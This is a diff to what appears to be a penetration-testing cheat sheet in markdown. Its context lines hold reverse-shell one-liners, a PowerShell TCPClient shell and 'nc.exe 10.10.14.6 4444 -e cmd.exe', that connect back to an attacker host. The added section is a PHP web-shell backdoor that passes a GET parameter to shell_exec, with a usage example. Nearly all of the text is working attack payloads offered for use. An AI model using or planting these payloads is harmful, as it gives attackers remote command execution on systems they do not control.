@@ -51,3 +51,13 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''10.1.1.1
 ```
 nc.exe 10.10.14.6 4444 -e cmd.exe
 ```
+
+### Backdoor
+
+PHP
+
+```
+<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+
+Usage: http://<IP>/<filenam>?e=whoami
+```
